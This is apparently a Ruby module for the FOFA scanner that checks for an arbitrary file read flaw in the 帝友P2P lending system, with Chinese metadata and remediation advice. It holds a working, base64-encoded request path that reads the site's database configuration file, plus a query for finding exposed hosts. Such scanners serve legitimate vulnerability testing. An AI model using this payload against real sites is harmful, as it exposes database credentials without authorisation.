if __FILE__ == $0
  require_relative '../fofascan'
end

require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def get_info
	{
      "Name": "帝友P2P借贷系统任意文件读取漏洞",
      "Description": "帝友P2P3.0以前存在任意文件读取漏洞，可读取数据库配置文件",
      "Product": "帝友P2P",
      "Homepage": "http://www.dyp2p.com/",
      "DisclosureDate": "2013-08-01",
      "Author": "blue-bird",
      "FofaQuery": "app=\"帝友P2P\"",
      "Level": "3",
      "Impact": "<p>泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
      "Recommandation": "<p>1、限定目录。</p><p>2、白名单限定可读取路径。</p>",
      "References": [
            "https://bugs.shuimugan.com/bug/view?bug_no=33114"
      ],
      "HasExp": false,
      "ExpParams": [],
      "is0day": false,
      "ExpTips": {
            "type": "Tips",
            "content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA==",
                        "follow_redirect": true,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "common.inc.php",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "fofacli_version": "3.0.8",
      "fofascan_version": "0.1.16",
      "Posttime": "2019-01-14 23:01:16",
      "status": 2
}
	end


  def initialize(info = {})
    super( info.merge(get_info()) )
  end

  def vulnerable(hostinfo)
    excute_scansteps(hostinfo) if @info['ScanSteps']
  end

  def exploit(hostinfo)
  end
end
if __FILE__ == $0
  do_my_scan($0, ARGV)
end